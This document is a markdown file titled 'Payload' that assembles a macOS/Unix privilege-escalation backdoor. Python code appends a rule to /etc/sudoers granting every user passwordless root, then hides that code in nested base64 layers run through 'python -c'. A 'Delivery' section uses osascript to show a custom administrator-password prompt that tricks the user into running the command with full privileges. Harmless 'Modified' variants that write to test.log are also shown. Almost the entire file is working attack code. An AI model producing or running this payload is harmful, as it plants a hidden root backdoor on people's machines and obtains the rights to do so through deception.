# Payload

## Part 1

```python
if os.getuid() == 0: os.system('echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers')
else: print("User is not root")
```

## Part 1 base64

```python
if os.getuid() == 0: os.system(base64.b64decode('ZWNobyAiQUxMIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMIiA+PiAvZXRjL3N1ZG9lcnM='))
else: print(base64.b64decode('VXNlciBpcyBub3Qgcm9vdA=='))
```

## Part 2

```python
import base64, os; exec(base64.b64decode('aWYgb3MuZ2V0dWlkKCkgPT0gMDogb3Muc3lzdGVtKGJhc2U2NC5iNjRkZWNvZGUoJ1pXTm9ieUFpUVV4TUlFRk1URDBvUVV4TUtTQk9UMUJCVTFOWFJEb2dRVXhNSWlBK1BpQXZaWFJqTDNOMVpHOWxjbk09JykpDQplbHNlOiBwcmludChiYXNlNjQuYjY0ZGVjb2RlKCdWWE5sY2lCcGN5QnViM1FnY205dmRBPT0nKSk='))
```

## Part 3

```python
python -c "$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oxcFhUbTlpZVVGcFVWVjRUVWxGUmsxVVJEQnZVVlY0VFV0VFFrOVVNVUpDVlRGT1dGSkViMmRSVlhoTlNXbEJLMUJwUVhaYVdGSnFURE5PTVZwSE9XeGpiazA5SnlrcERRcGxiSE5sT2lCd2NtbHVkQ2hpWVhObE5qUXVZalkwWkdWamIyUmxLQ2RXV0U1c1kybENjR041UW5WaU0xRm5ZMjA1ZG1SQlBUMG5LU2s9Jykp | base64 -D)"
```

or

```bash
python -c \"$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oxcFhUbTlpZVVGcFVWVjRUVWxGUmsxVVJEQnZVVlY0VFV0VFFrOVVNVUpDVlRGT1dGSkViMmRSVlhoTlNXbEJLMUJwUVhaYVdGSnFURE5PTVZwSE9XeGpiazA5SnlrcERRcGxiSE5sT2lCd2NtbHVkQ2hpWVhObE5qUXVZalkwWkdWamIyUmxLQ2RXV0U1c1kybENjR041UW5WaU0xRm5ZMjA1ZG1SQlBUMG5LU2s9Jykp | base64 -D)\"
```

## Modified Part 1

```python
if os.getuid() == 0: os.system('echo "ALL ALL=(ALL) NOPASSWD: ALL" >> test.log; echo echoed')
else: print("User is not root")
```

## Modified Part 2

```python
import base64, os; exec(base64.b64decode('aWYgb3MuZ2V0dWlkKCkgPT0gMDogb3Muc3lzdGVtKCdlY2hvICJBTEwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IHRlc3QubG9nOyBlY2hvIGVjaG9lZCcpDQplbHNlOiBwcmludCgiVXNlciBpcyBub3Qgcm9vdCIp'))
```

## Modified Part 3

```python
python -c "$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtDZGxZMmh2SUNKQlRFd2dRVXhNUFNoQlRFd3BJRTVQVUVGVFUxZEVPaUJCVEV3aUlENCtJSFJsYzNRdWJHOW5PeUJsWTJodklHVmphRzlsWkNjcERRcGxiSE5sT2lCd2NtbHVkQ2dpVlhObGNpQnBjeUJ1YjNRZ2NtOXZkQ0lwJykp | base64 -D)"
```

or

```bash
python -c \"$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtDZGxZMmh2SUNKQlRFd2dRVXhNUFNoQlRFd3BJRTVQVUVGVFUxZEVPaUJCVEV3aUlENCtJSFJsYzNRdWJHOW5PeUJsWTJodklHVmphRzlsWkNjcERRcGxiSE5sT2lCd2NtbHVkQ2dpVlhObGNpQnBjeUJ1YjNRZ2NtOXZkQ0lwJykp | base64 -D)\"
```

## Delivery

```bash
osascript <<END
    set command to "{command}"
    return do shell script command with prompt "{prompt}" with administrator privileges
END
```
